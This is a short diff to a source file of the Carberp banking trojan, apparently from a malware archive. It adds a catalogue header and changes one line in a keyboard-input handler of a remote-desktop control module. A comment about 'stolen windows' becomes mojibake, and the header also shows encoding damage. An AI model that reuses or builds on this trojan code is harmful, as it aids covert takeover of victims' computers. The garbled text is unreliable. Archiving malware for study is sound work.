@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "..\includes.h"
 #include "kbd.h"
 #include "kbd_data.h"
@@ -562,7 +573,7 @@ void ProcessKbdMsg(rfbClientPtr cl,DWORD dwKeySym,rfbBool bDown)
                 if (hPopupWnd)
                 {
                     hWnd=hPopupWnd;
-                    SetForegroundWnd(lpServer,hWnd); ///продумать для краденых окон
+                    SetForegroundWnd(lpServer,hWnd); ///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
                 }
                 HWND hFocusWnd=GetWindowFocus(hWnd);
                 if (hFocusWnd)
